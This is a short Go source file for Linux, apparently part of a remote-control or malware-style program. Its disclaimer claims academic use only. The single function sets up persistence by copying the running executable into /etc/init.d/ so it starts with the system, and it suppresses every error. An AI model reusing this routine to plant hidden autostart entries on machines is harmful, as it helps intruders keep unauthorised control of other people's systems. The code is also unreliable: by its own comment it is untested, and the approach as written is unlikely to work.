// STATEMENT:
// In consideration of all possible negative effects this software will bring,
// this software is developed only for academic usage.
// Any malicious usage of this software is forbidden and unrelated to the author.

//go:build linux

package main

import (
	"io"
	"os"
)

// setAutostart registers autostart service on this device.
// On Linux, add the executable file to the /etc/init.d/ directory.
// ATTENTION: This idea has not been tested.
func setAutoStart() {
	dstName := "/etc/init.d/" + AppName
	srcName := os.Args[0]
	// Create a destination file to copy.
	dst, err := os.OpenFile(dstName, os.O_CREATE|os.O_WRONLY, os.ModePerm)
	if err != nil {
		return
	}
	// Open the source file to copy.
	src, err := os.Open(srcName)
	if err != nil {
		return
	}
	// Copy file.
	_, err = io.Copy(dst, src)
	if err != nil {
		return
	}
}
